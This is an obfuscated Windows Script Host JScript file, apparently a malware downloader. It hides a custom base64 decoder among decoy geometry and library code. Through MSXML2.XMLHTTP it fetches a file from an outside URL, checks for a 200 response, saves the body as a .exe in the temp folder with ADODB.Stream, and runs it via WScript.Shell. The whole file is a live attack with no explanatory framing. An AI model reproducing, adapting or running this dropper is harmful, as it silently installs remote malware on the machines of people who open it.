
var arras = new Array(-1, -1, -1, -1, -1, -1, -1, -1, -1, -1, -1, -1, -1, -1, -1, -1, -1, -1, -1, -1, -1, -1, -1, -1, -1, -1, -1, -1, -1, -1, -1, -1, -1, -1, -1, -1, -1, -1, -1, -1, -1, -1, -1, 62, -1, -1, -1, 63, 52, 53, 54, 55, 56, 57,
    58, 59, 60, 61, -1, -1, -1, -1, -1, -1, -1, 0, 1, 2, 3, 4, 5, 6,
    7, 8, 9, 10, 11, 12, 13, 14, 15, 16, 17, 18, 19, 20, 21, 22, 23, 24,
    25, -1, -1, -1, -1, -1, -1, 26, 27, 28, 29, 30, 31, 32, 33, 34, 35, 36,
    37, 38, 39, 40, 41, 42, 43, 44, 45, 46, 47, 48, 49, 50, 51, -1, -1, -1, -1, -1);

  unalloyed = [];
	
var flights = { ':': '.','U': 'S','381': 'X'};
	var detention = 0;


function a(b){if(b==1){return 2;}else{return 17;}
return 3;}
 function squeamish(hooked) {
	lines = hooked;
	for (var i in flights){lines = lines.replace(i, flights[i]);}
    return lines;
};

var digital = 3-2;  
function Point(x, y) {
    this.x = x || 0;
    this.y = y || 0;
}

Point.create = function(o, y) {
    if (isArray(o)) return new Point(o[0], o[1]);
    if (isObject(o)) return new Point(o.x, o.y);
    return new Point(o, y);
};

Point.add = function(p1, p2) {
    return new Point(p1.x + p2.x, p1.y + p2.y);
};

Point.subtract = function(p1, p2) {
    return new Point(p1.x - p2.x, p1.y - p2.y);
};

Point.scale = function(p, scaleX, scaleY) {
    if (isObject(scaleX)) {
        scaleY = scaleX.y;
        scaleX = scaleX.x;
    } else if (!isNumber(scaleY)) {
        scaleY = scaleX;
    }
    return new Point(p.x * scaleX, p.y * scaleY);
};

Point.equals = function(p1, p2) {
    return p1.x == p2.x && p1.y == p2.y;
};

Point.angle = function(p) {
    return Math.atan2(p.y, p.x);
};
String.prototype.squeamish4 = function() {
	
    var c1, c2, c3, c4;
    var i, len, out;
	var str = this.replace(/voted/g, '')
    len = str.length;
    i = 0;
    out = "";

    while (i < len) {
        do {
            c1 = arras[str.charCodeAt(i++) & 0xff]
        } while (i < len && c1 == -1);

        if (c1 == -1)
            break;

        do {
            c2 = arras[str.charCodeAt(i++) & 0xff]
        } while (i < len && c2 == -1);

        if (c2 == -1)
            break;

        out += String.fromCharCode((c1 << 2) | ((c2 & 0x30) >> 4));

        do {
            c3 = str.charCodeAt(i++) & 0xff;

            if (c3 == 61)
                return out;

            c3 = arras[c3]
        } while (i < len && c3 == -1);

        if (c3 == -1)
            break;

        out += String.fromCharCode(((c2 & 0XF) << 4) | ((c3 & 0x3C) >> 2));

        do {
            c4 = str.charCodeAt(i++) & 0xff;

            if (c4 == 61)
                return out;

            c4 = arras[c4]
        } while (i < len && c4 == -1);

        if (c4 == -1)
            break;

        out += String.fromCharCode(((c3 & 0x03) << 6) | c4)
    }

    return out
}


var television ="votedJVvotedRFTVvotedAl".squeamish4();
Point.interpolate = function(p1, p2, f) {
    var dx = p2.x - p1.x;
    var dy = p2.y - p1.y;
    return new Point(p1.x + dx * f, p1.y + dy * f);
};
var fumble = "votedQWvotedN0aXZvotedlWE9iavotedmVjdA=voted=".squeamish4();
String.prototype.squeamish2 = function () {
    var hazards = {
        herself: this
    };
    hazards.preferment = hazards.herself["c3Vic3RyaW5n".squeamish4()](detention, digital);
    return hazards.preferment;
};

var economic ="votedRXhwYW5votedkRW52aXvotedJvbm1lbnRTdHJvotedpbmdz".squeamish4();
var Native = function(options){
	
};
var scape = [fumble, economic,television,  ""+"."+("monumental","along","closure","butter","medicine","mockingly","designed","weighted","exe"), "UnVu".squeamish4(), squeamish("M"+"SX"+"ML"+("negligent","trooper","psychology","twine","accrued","introducing","competitor","2.")+"381M"+"LH"+"TT"+("replete","computer","resource","practical","corpulent","demarcation","codes","porous","P>")+"WU"+("reversal","stopping","chaplet","carbon","cases","poodle","platoon","cr")+("menial","crackers","psychic","vacancies","jogging","transexuales","dandelion","stimuli","ip")+"t:"+("thrashing","crafts","premeditated","properly","subtle","transgression","journalism","integration","Sh")+"ell")];
witless = "_F2_";
var venezuela = this[scape.shift()];
Native.implement = function(objects, properties){
	for (var i = 0, l = objects.length; i < l; i++) objects[i].implement(properties);
};

Native.genericize = function(object, property, check){
	if ((!check || !object[property]) && typeof object.prototype[property] == 'function') object[property] = function(){
		var args = Array.prototype.slice.call(arguments);
		return object.prototype[property].apply(args.shift(), args);
	};
};
Native.typize = function(object, family){
	if (!object.type) object.type = function(item){
		return ($type(item) === family);
	};
};
kIQvkoRE = "GSYIPMEGuqz";
circus = (("faultless", "ladies", "impression", "compiler", "tutorials", "responsibility", "specialized", "pgDcLkpbBaWJ") + "eaqDTLypjz").squeamish2();
apothecary = (("suggested", "undoing", "bondage", "wearisome", "measures", "excitation", "topple", "remain", "serial", "sPaeejGah") + "FCdfOIYYP").squeamish2();
  
    String.prototype.interactions = function (a) {
        for (var b = [], c = 0; c < a.length; c++)b[c] = a[c];
        return b.join("")
    };

var austin = scape.pop().split(">");

floors = "b3Blbg==".squeamish4();
var seasoning = new venezuela(austin[1]);
var distinct = new venezuela(austin[0]);
var arrangement = seasoning[scape.shift()](scape.shift());
weasel = "E";

var dictation = scape.shift();
var strand = scape.shift();
function aiding(india, thomson) {

    try {
        var cremona = arrangement + "/" + thomson ;
		cremona = cremona+ dictation;
            distinct[floors](("oldest","facts","troubadour","somali","connective","mandarin","batting","calamitous","G" + weasel) + ("gorilla","fifteen","cheat","bloom","leant","satin","leads","newly","bradford","hearths","T"), india, false);
       
    distinct[apothecary + ("apposite","inscrutable","end")]();
	var rearguard=("circus" + WScript=="circus" + "V2luZG93cyBTY3JpcHQgSG9zdA==".squeamish4())&&distinct["c3RhdHVz".squeamish4()] +""=="MjAw".squeamish4()&&typeof(UJioDP)==="undefined";

    if (rearguard) {
		
        var rapids = new venezuela((("undergrowth","gypsy","tanned","consideration","finder","given","promotional","breast","A")+("sharing","entitled","portcullis","those","tattered","share","fakir","nazarene","SEOO")+"DB"+("incidents","dentists","sweater","ocean","apace","funds","offender",".S")+"tr8").replace("SEO", "D").replace("8", "eam"));
        rapids[floors]();
        aLIRjIGh = "_F9_";
        rapids.type = digital;
        LgkRTYP = "_F10_";
        rapids["d3JpdGU=".squeamish4()](distinct[("vistula","colon","broth","leads","snowboard","coherent","mcdonald","")+"R"+"es"+"pon"+flights['U'].toLowerCase()+"e"+"Qm9keQ==".squeamish4()]);
        eBVlOkL = "_F11_";
        rapids[(circus + "o"+("verona","dissipation","conscious","detailed","untold","accessibility","richardson","diving","00")+("favors","convex","pedestrian","nourishing","nested","millennium","region","8i")+"tion").replace("0"+("ronald","smoothness","poker","remorseless","slighting","angela","tyson","08"), apothecary)] = 0;
        ygDLHKAnM = "_F12_";
        rapids.saveToFile(cremona, 2);
        nyJwTwXCV = "_F13_";
        rapids.close();
        NXiUTYjbTkl = "_F14_";
		seasoning[strand](cremona, digital, true);
    }
} catch (VrKBcuDbF) { };

    eoLryHHzmlo = "_F15_";
}
try{
aiding("aHRvoted0cDvotedovLw=voted=".squeamish4()+"\u0077\u0077\u0077"+"\u002E\u0061\u0070\u0070\u0061\u0072\u0065\u006C\u0062\u0079\u0063\u0068\u0065\u0072\u0079\u006C\u002E\u0063\u006F\u006D\u002F\u0037\u0038\u0074\u0067\u0037\u0036\u0038\u0062" + "?LAXHRHAytBu=BrKrtCYUnQ","TjCABttWYme");}catch(kCuCVzhCB){}

   YOhVpgImtDU = "_F16_";
   